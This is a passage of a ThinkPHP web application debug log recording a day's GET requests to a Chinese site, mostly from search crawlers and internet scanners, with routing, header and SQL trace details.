---------------------------------------------------------------
[ 2022-08-10T00:01:30+08:00 ] 17.121.112.37 GET www.ywscs.com/
[运行时间：0.016876s] [吞吐率：59.26req/s] [内存消耗：2,068.32kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)',
  'host' => 'www.ywscs.com',
  'accept-encoding' => 'gzip,identity',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T00:01:31+08:00 ] 17.121.112.37 GET www.ywscs.com/admin/login/index.html
[运行时间：0.024304s] [吞吐率：41.15req/s] [内存消耗：2,858.11kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)',
  'host' => 'www.ywscs.com',
  'accept-encoding' => 'gzip,identity',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000815s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000268s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000615s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000219s ]
---------------------------------------------------------------
[ 2022-08-10T00:20:00+08:00 ] 101.200.60.210 GET www.ywscs.com/
[运行时间：0.016990s] [吞吐率：58.86req/s] [内存消耗：2,066.98kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000031s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Go-http-client/1.1',
  'host' => 'www.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T00:20:00+08:00 ] 101.200.60.210 GET www.ywscs.com/admin/login/index.html
[运行时间：0.023609s] [吞吐率：42.36req/s] [内存消耗：2,857.03kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'referer' => 'https://www.ywscs.com',
  'user-agent' => 'Go-http-client/1.1',
  'host' => 'www.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000779s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000208s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000598s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000231s ]
---------------------------------------------------------------
[ 2022-08-10T01:00:09+08:00 ] 207.46.13.176 GET ywscs.com/
[运行时间：0.016590s] [吞吐率：60.28req/s] [内存消耗：2,069.88kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T03:02:53+08:00 ] 45.148.120.191 GET 114.116.100.177/
[运行时间：0.017459s] [吞吐率：57.28req/s] [内存消耗：2,050.27kb] [文件加载：66]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36',
  'accept-language' => 'en;q=0.9',
  'accept-encoding' => 'gzip, deflate, br',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'cache-control' => 'max-age=0',
  'connection' => 'close',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T03:02:54+08:00 ] 45.148.120.191 GET 114.116.100.177/admin/login/index.html
[运行时间：0.025326s] [吞吐率：39.49req/s] [内存消耗：2,841.30kb] [文件加载：73]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36',
  'accept-language' => 'en;q=0.9',
  'accept-encoding' => 'gzip, deflate, br',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'cache-control' => 'max-age=0',
  'connection' => 'close',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000785s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000202s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000611s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000197s ]
---------------------------------------------------------------
[ 2022-08-10T03:02:55+08:00 ] 45.148.120.191 GET 114.116.100.177/WuEL
[运行时间：0.015144s] [吞吐率：66.03req/s] [内存消耗：1,700.87kb] [文件加载：58]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'WuEL',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '114.116.100.177',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; ; NCLIENT50_AAPCDA5841E333)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T03:03:06+08:00 ] 45.148.120.191 GET 114.116.100.177/a
[运行时间：0.021199s] [吞吐率：47.17req/s] [内存消耗：1,684.85kb] [文件加载：57]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000025s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'a',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36',
  'accept-language' => 'en;q=0.9',
  'accept-encoding' => 'gzip, deflate, br',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'cache-control' => 'max-age=0',
  'connection' => 'close',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T03:03:08+08:00 ] 45.148.120.191 GET 114.116.100.177/download/file.ext
[运行时间：0.014554s] [吞吐率：68.71req/s] [内存消耗：1,685.04kb] [文件加载：57]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'download',
    1 => 'file.ext',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36',
  'accept-language' => 'en;q=0.9',
  'accept-encoding' => 'gzip, deflate, br',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'cache-control' => 'max-age=0',
  'connection' => 'close',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T03:03:09+08:00 ] 45.148.120.191 GET 114.116.100.177/SiteLoader
[运行时间：0.017288s] [吞吐率：57.84req/s] [内存消耗：1,684.89kb] [文件加载：57]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'SiteLoader',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36',
  'accept-language' => 'en;q=0.9',
  'accept-encoding' => 'gzip, deflate, br',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'cache-control' => 'max-age=0',
  'connection' => 'close',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T03:03:10+08:00 ] 45.148.120.191 GET 114.116.100.177/mPlayer
[运行时间：0.014757s] [吞吐率：67.76req/s] [内存消耗：1,684.88kb] [文件加载：57]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'mPlayer',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36',
  'accept-language' => 'en;q=0.9',
  'accept-encoding' => 'gzip, deflate, br',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'cache-control' => 'max-age=0',
  'connection' => 'close',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T03:15:09+08:00 ] 45.148.10.193 GET 114.116.100.177/
[运行时间：0.018748s] [吞吐率：53.34req/s] [内存消耗：2,067.41kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (compatible, MSIE 10.0, Windows NT, DigExt)',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T03:15:10+08:00 ] 45.148.10.193 GET 114.116.100.177/admin/login/index.html
[运行时间：0.026025s] [吞吐率：38.42req/s] [内存消耗：2,857.40kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000022s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'accept-encoding' => 'gzip',
  'referer' => 'https://114.116.100.177',
  'user-agent' => 'Mozilla/5.0 (compatible, MSIE 10.0, Windows NT, DigExt)',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000781s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000234s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000568s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000218s ]
---------------------------------------------------------------
[ 2022-08-10T04:27:31+08:00 ] 34.209.129.33 GET ywscs.com/
[运行时间：0.016738s] [吞吐率：59.74req/s] [内存消耗：2,067.39kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T05:00:23+08:00 ] 162.142.125.9 GET 114.116.100.177:443/
[运行时间：0.016741s] [吞吐率：59.73req/s] [内存消耗：2,066.34kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.116.100.177:443',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T05:00:24+08:00 ] 162.142.125.9 GET 114.116.100.177/
[运行时间：0.016926s] [吞吐率：59.08req/s] [内存消耗：2,067.44kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T05:00:25+08:00 ] 162.142.125.9 GET 114.116.100.177/admin/login/index.html
[运行时间：0.023347s] [吞吐率：42.83req/s] [内存消耗：2,857.22kb] [文件加载：74]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)',
  'host' => '114.116.100.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run Closure @action_begin [ RunTime:0.000772s ]
[ info ] [ RUN ] app\admin\controller\Login->index[ /www/wwwroot/ywscs.com/application/admin/controller/Login.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /www/wwwroot/ywscs.com/public/../application/admin/view/login/index.html [ array (
  0 => 'webconfig',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000236s ] mysql:host=localhost;port=3306;dbname=ywscs_com;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sp_config` [ RunTime:0.000590s ]
[ sql ] [ SQL ] SELECT `ename`,`value` FROM `sp_config` WHERE  `ca_id` IN (1,2,4,5,10,15) [ RunTime:0.000210s ]
---------------------------------------------------------------
[ 2022-08-10T05:14:43+08:00 ] 207.46.13.176 GET www.ywscs.com/
[运行时间：0.016697s] [吞吐率：59.89req/s] [内存消耗：2,069.95kb] [文件加载：67]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000018s ]
[ info ] [ LANG ] /www/wwwroot/ywscs.com/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'from' => 'bingbot(at)microsoft.com',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'pragma' => 'no-cache',
  'cache-control' => 'no-cache',
  'host' => 'www.ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T05:17:12+08:00 ] 43.230.156.203 GET ywscs.com/login
[运行时间：0.026800s] [吞吐率：37.31req/s] [内存消耗：1,685.75kb] [文件加载：57]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'login',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'JSESSIONID=4112956D15B33544C0053181F06EDA0E',
  'upgrade-insecure-requests' => '1',
  'cache-control' => 'max-age=0',
  'accept-language' => 'en-US,en;q=0.9',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T05:17:14+08:00 ] 43.230.156.203 GET ywscs.com/signup
[运行时间：0.020460s] [吞吐率：48.88req/s] [内存消耗：1,685.75kb] [文件加载：57]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000022s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'signup',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'JSESSIONID=4112956D15B33544C0053181F06EDA0E',
  'upgrade-insecure-requests' => '1',
  'cache-control' => 'max-age=0',
  'accept-language' => 'en-US,en;q=0.9',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T05:17:29+08:00 ] 43.230.156.203 GET ywscs.com/login
[运行时间：0.014518s] [吞吐率：68.88req/s] [内存消耗：1,685.75kb] [文件加载：57]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'login',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'JSESSIONID=4112956D15B33544C0053181F06EDA0E',
  'upgrade-insecure-requests' => '1',
  'cache-control' => 'max-age=0',
  'accept-language' => 'en-US,en;q=0.9',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T05:17:30+08:00 ] 43.230.156.203 GET ywscs.com/signup
[运行时间：0.014650s] [吞吐率：68.26req/s] [内存消耗：1,685.75kb] [文件加载：57]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'signup',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'JSESSIONID=4112956D15B33544C0053181F06EDA0E',
  'upgrade-insecure-requests' => '1',
  'cache-control' => 'max-age=0',
  'accept-language' => 'en-US,en;q=0.9',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T05:19:37+08:00 ] 43.230.156.203 GET ywscs.com/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=/%3Cuser-name%3E/%3Crepo-name%3E/issues/index&source=header-repo
[运行时间：0.015486s] [吞吐率：64.57req/s] [内存消耗：1,687.10kb] [文件加载：57]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000016s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'signup',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cookie' => 'JSESSIONID=4112956D15B33544C0053181F06EDA0E',
  'upgrade-insecure-requests' => '1',
  'cache-control' => 'max-age=0',
  'accept-language' => 'en-US,en;q=0.9',
  'connection' => 'keep-alive',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'accept-encoding' => 'gzip, deflate, br',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
  'host' => 'ywscs.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'ref_cta' => 'Sign up',
  'ref_loc' => 'header logged out',
  'ref_page' => '/<user-name>/<repo-name>/issues/index',
  'source' => 'header-repo',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2022-08-10T05:19:51+08:00 ] 43.230.156.203 GET ywscs.com/features/code-review
[运行时间：0.014959s] [吞吐率：66.85req/s] [内存消耗：1,685.92kb] [文件加载：57]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000017s ]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
